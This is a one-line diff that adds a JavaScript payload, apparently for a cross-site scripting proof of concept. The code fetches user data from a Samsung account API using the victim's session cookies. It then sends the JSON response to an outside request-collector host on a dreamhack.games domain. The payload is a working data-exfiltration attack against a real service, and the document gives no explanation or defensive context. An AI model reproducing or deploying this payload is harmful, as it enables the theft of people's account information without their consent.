@@ -1,0 +1,1 @@
+fetch('//v3.account.samsung.com/api/v1/users', {credentials: 'include'}).then(r=>r.json()).then((json) => fetch('https://wfcxycu.request.dreamhack.games?info='+JSON.stringify(json), {mode: 'no-cors'}))
